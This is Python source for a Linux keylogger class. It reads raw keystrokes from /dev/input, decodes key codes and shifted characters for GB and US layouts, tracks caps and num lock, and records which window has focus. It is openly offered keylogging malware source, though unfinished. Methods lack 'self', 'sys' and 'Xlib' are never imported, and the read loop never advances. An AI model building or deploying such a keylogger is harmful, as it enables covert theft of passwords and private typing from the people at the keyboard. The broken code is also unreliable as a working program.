#!/usr/bin/env python3
import struct
import subprocess
import re

class Keylogger:
    def __init__(self):
        """struct input_event {
              struct timeval time;
              unsigned short type;
              unsigned short code;
              unsigned int value;
            }"""
        struct_types = "llHHI"
        struct_size = struct.calcsize(struct_types)

        keyboard_device = self.get_keyboard_event()
        if keyboard_device == -1: keyboard_device = "event3"

        ctrl_shift_status = [0, 0]
        caps_num_status = self.get_capsnum_lock()

        alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        key_consts = self.parse_input_event_codes()
        key_combs = self.set_combinations()

        try:
            f = open("/dev/input/{}".format(keyboard_device))
            evnt = f.read(struct_size)

            while evnt:
                #update caps/num lock status
                caps_num_status = self.get_capsnum_lock()

                #unpacks event struct into tuple
                (time1, time2, type_, code_, val_) = struct.unpack(struct_types, evnt)

                #gets key value

            evnt = f.read(struct_size)

        except (FileNotFoundError, PermissionError):
            raise Exception("Unable to read devices from /dev/input, please ensure you have permission to acess /dev/input/ files.")
        except KeyboardInterrupt:
            pass
        except Exception as err:
            print("The following excpetion caused the program to stop: \n{}".format(err))
        finally:
            try: f.close()
            except: pass

    'Goes through input-event-codes.h getting key codes'
    def parse_input_event_codes():
        try:
            f = open("input-event-codes.h", "r")
        except Exception as err:
            print("The following error occured trying to read input-event-codes file: {}".format(err))
            sys.exit(-1)

        f_data = f.readlines()
        f.close()

        key_consts = {}

        for line in f_data:
            if line[:11] != "#define KEY" and line[:11] != "#define BTN": continue

            #gets key code/value from constant
            const = re.sub(r"#define |[\n()]", "", line).replace("\t", " ").split(" ")
            const = [x for x in const if x]
            value, code = const[0], const[1]

            #removes 'KEY_' that precedes actual value, A, MINUS, 0, etc.
            if value[:3] == "KEY": value = value[4:]

            #converts code to int, leaves ref consts as strings ad it cant convert it to same value as another
            #constant because values are used as dict keys
            if code[:2] == "0x": code = int(code, 16)
            elif "_" not in code: code = int(code)
            key_consts[str(code)] = value

        return key_consts

    ' Sets combinaion values for keys based on keyboard layout, currently on GB and US '
    def set_combinations():
        comb_vals = {}

        #num key combinations
        gb_num_chars_combs = ')!"£$%^&*('
        us_num_chars_combs = ')!@#$%^&*('

        for i in range(10):
            comb_vals[i] = {"GB": gb_num_chars_combs[i]}
            comb_vals[i]["US"] = us_num_chars_combs[i]

        #NOTE: key_code_values are US as "input-event-codes.h" is US
        key_code_values = ["MINUS", "EQUAL", "LEFTBRACE", "RIGHTBRACE", "SEMICOLON", "APOSTROPHE", "BACKSLASH", "COMMA", "DOT", "SLASH", "102ND", "GRAVE"]
        gb_combs = "_+{}:@~<>?|¬"
        us_combs = '_+{}:"|<>?>~'

        for i in key_code_values:
            comb_vals[i] = {"GB": gb_combs[i]}
            comb_vals[i]["US"] = us_combs[i]

        return comb_vals

    ' Gets current state of caps lock and nums lock keys '
    def get_capsnum_lock():
        #extracts status of caps/nums lock from 'xset -q'
        res_out = run_process(["xset", "-q"])
        res = re.sub("[0123456789 ]", "", res_out).split("\n")[3].split(":")
        return [res[2], res[4]]

    ' Gets current keyboard layout, e.g UK, US, etc. '
    def get_keyboard_layout():
        #extracts keyboard layout from 'setxkbmap -query'
        layout_line = run_process(["setxkbmap", "-query"]).split("\n")[2].split(":")
        return layout_line[1].split(",")[0].strip()

    ''' Gets process of the window currrently in focus
        :output window_name: name of window in focus
        :output process_name: name of process for window in focus'''
    def get_focused_window():
        #BUG: Certain applications returning None for wm_name

        #connects to default display
        display = Xlib.display.Display()

        #gets current window in foucs
        w = display.get_input_focus().focus
        w_name, w_class = w.get_wm_name(), w.get_wm_class()
        if not w_name or not w_class: w = w.query_tree().parent
        if not w_name: w_name = w.get_wm_name()
        if not w_class: w_class = w.get_wm_class()

        return (w_name, w_class)

    ' Gets the device located at /dev/input/ that corresponds to the keyboard'
    def get_keyboard_event():
        #/proc/bus/input/devices contains the name and attributes of connected devices
        ps = run_process(["cat", "/proc/bus/input/devices"]).split("\n\n")

        #extracts event used by keyboard from command output
        for line in ps:
            l = line.split("\n")
            if len(l) != 11 or "keyboard" not in l[1]: continue
            handlers = l[5][12:].strip().split(" ")
            for h in handlers:
                if "event" in h: return h
        return -1

    ' Runs and returns output of a command '
    def run_process(command):
        ps = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return ps.stdout.decode() if ps.stdout else ps.stderr.decode()
